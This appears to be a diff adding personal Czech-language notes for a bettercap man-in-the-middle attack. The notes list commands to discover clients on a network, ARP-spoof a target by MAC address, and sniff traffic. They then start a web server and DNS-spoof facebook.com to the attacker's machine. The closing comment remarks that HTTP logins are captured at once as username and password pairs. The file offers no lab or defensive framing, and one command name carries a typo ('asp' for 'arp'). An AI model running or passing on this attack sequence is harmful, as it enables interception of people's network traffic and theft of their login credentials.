@@ -1,0 +1,20 @@
+sudo bettercap
+net.probe on (najde všechny klienty na síti, asi netřeba)
+net.show =ukáže IP a MAC věcí na síti
+set asp.spoof.targets [MAC clienta] 
+arp.spoof on
+
+net.sniff on
+
+******
+net.sniff off
+
+service apache2 start
+
+ifconfig (=moje IP)
+
+set dns.spoof.domains facebook.com
+dns.spoof on
+
+
+(při přihlašování na HTTP to hned zachytí loginy a hesla jako uname=xxxxx&pass=xxxx)
